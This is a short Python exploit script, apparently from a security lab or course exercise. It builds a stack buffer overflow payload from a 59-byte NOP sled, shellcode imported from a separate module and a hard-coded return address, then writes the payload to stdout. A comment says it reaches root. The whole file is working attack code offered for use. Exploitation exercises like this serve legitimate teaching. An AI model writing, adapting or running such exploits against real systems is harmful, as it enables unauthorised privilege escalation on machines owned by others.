import sys
from struct import pack
from shellcode import shellcode

# no segfault 50, goes into root at 59
addr = pack('<I',0xfff6eedc)
slide = b'\x90'*59
payload = slide + shellcode + addr

# Launch the attack!
sys.stdout.buffer.write(payload)
